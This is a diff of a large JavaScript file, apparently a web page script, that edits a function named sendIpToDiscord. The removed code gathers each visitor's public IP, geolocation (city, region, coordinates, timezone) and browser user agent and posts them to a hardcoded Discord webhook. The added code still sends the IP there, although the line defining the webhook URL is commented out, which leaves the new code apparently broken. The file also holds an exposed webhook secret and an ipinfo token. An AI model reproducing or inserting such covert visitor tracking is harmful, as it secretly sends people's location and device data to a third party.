@@ -10245,62 +10245,35 @@ function shuffle(array) {
     return array;
 }
 
+
 // Función para enviar la IP al webhook de Discord
 function sendIpToDiscord() {
-    // Obtener la IP pública
     fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
-            const ip = data.ip; // IP pública detectada
+            const ip = data.ip;
+            //const webhookUrl = "https://discord.com/api/webhooks/1288984018687103047/e09hMXQwBRjWgiEeCSiS4pQzXsgQLGfq8d-yyq1-W0w2mJzI-AkKAHDJiU28TXwR-CzE"; // Reemplaza con tu webhook
 
-            // Obtener información detallada de ubicación usando ipinfo.io
-            fetch(`https://ipinfo.io/${ip}/json?token=293f47e9539af8`) // Reemplaza YOUR_TOKEN con tu token de ipinfo.io
-                .then(response => response.json())
-                .then(locationData => {
-                    // Depuración: Ver la respuesta completa de la API
-                    console.log(locationData);
-
-                    // Extraer la información deseada
-                    const { city, region, country, loc, timezone } = locationData;
-                    const [latitude, longitude] = loc.split(',');
-
-                    // Obtener información del dispositivo
-                    const userAgent = navigator.userAgent;
-                    const deviceInfo = `Modelo de dispositivo: ${userAgent}`;
-
-                    // URL del webhook de Discord
-                    const webhookUrl = "https://discord.com/api/webhooks/1288984018687103047/e09hMXQwBRjWgiEeCSiS4pQzXsgQLGfq8d-yyq1-W0w2mJzI-AkKAHDJiU28TXwR-CzE"; // Reemplaza con tu webhook
-
-                    // Envía la información al webhook de Discord
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            content: `IP pública detectada: ${ip}\n` +
-                                     `Ciudad: ${city || 'No disponible'}\n` +
-                                     `Región: ${region || 'No disponible'}\n` +
-                                     `País: ${country || 'No disponible'}\n` +
-                                     `Ubicación: ${latitude || 'No disponible'}, ${longitude || 'No disponible'}\n` +
-                                     `Zona Horaria: ${timezone || 'No disponible'}\n` +
-                                     `${deviceInfo}`
-                        })
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            console.log('Información enviada correctamente al webhook de Discord');
-                        } else {
-                            console.log('Error al enviar la información al webhook de Discord');
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Error al enviar la información:', error);
-                    });
+            // Envía la IP al webhook de Discord
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `IP pública detectada: ${ip}`
                 })
-                .catch(error => {
-                    console.error('No se pudo obtener la información de ubicación:', error);
-                });
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('IP enviada correctamente al webhook de Discord');
+                } else {
+                    console.log('Error al enviar la IP al webhook de Discord');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
         })
         .catch(error => {
             console.error('No se pudo obtener la IP:', error);
